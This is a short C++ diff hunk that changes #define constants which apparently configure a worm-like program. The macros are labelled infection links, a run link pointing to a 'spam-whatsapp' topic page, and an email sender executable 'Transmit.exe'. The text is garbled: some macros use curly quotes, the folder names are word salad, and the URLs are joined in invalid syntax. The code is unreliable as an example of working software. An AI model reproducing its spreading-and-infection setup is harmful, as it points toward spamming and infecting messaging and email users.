@@ -20,7 +20,7 @@ using namespace std;
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
 #define RUN_Link_NAME “https://github.com/topics/spam-whatsapp/forks"
-#define INFECT_Link_NAME "https://www.whatsapp.com/?lang=id"."https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
+#define INFECT_Link_NAME "https://workspace.google.com/intl/en/gmail/"."https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
